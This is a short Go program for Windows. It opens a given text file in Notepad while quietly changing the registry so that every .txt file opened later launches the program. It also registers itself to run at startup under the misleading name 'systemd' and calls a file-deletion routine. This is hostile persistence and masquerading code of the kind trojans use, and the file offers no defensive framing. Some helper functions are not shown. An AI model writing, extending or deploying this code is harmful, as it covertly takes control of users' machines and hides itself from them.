package main

import (
	"fmt"
	"os"
	"os/exec"
	"sync"
)

var DEBUG = true
var exePath string
var wg sync.WaitGroup

func main() {
	var txtFileName string

	if len(os.Args) == 2 {
		txtFileName = os.Args[1]
		fmt.Println(txtFileName)
		notepadCmd := exec.Command("notepad.exe", txtFileName)
		notepadCmd.Run()
		wg.Add(2)
		go startWithWindows(&wg)
		go deleteFile("", &wg)
		wg.Wait()
	}

	//%SystemRoot%\system32\notepad.exe %1
	exePath, _ = execPath()
	wg.Add(3)
	go changeOpenType(&wg)
	go startWithWindows(&wg)
	go deleteFile("", &wg)
	wg.Wait()
}

func changeOpenType(wg *sync.WaitGroup) {
	setRegister("txtfile\\shell\\open\\command", "", "expand", exePath+" %1")
	wg.Done()
}

func startWithWindows(wg *sync.WaitGroup) {
	setRegister("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "systemd", "string", exePath)
	wg.Done()
}
